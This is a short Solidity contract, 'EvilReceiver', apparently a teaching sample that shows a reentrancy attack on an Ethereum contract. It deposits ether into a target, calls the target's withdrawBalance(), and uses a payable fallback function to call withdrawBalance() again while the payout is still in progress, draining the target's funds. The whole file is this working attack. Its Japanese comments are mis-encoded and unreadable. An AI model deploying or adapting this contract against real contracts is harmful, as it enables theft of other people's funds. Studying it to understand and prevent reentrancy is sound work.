pragma solidity ^0.4.11;
contract  EvilReceiver {
  
  // �U���ΏۃR���g���N�g�̃A�h���X
  address public target;

  // ���b�Z�[�W�\���p�̃C�x���g
  event MessageLog(string);
  
  // �c���\���p�̃C�x���g
  event BalanceLog(uint);

  /// �R���X�g���N�^
  function EvilReceiver(address _target) public{
    target = _target;
  }
  
  /// Fallback�֐�
  function() payable public{
    BalanceLog(this.balance);
    
    // VictimBalance��withdrawBalance���ďo��
    if(!msg.sender.call.value(0)(bytes4(keccak256("withdrawBalance()")))) {
      MessageLog("FAIL");
    } else {
      MessageLog("SUCCESS");
    } 
  }

  /// EOA����̑������ɗ��p����֐�
  function addBalance() public payable {
  }

  /// �U���Ώۂւ̑������ɗ��p����֐�
  function sendEthToTarget() public {
    if(!target.call.value(1 ether)(bytes4(keccak256("addToBalance()")))) 
    {
      revert();
    } 
  }

  ///�@�U���Ώۂ���̈��o�����ɗ��p����֐�
  function withdraw() public {
    if(!target.call.value(0)(bytes4(keccak256("withdrawBalance()")))) 
    {
      revert();
    } 
  }
}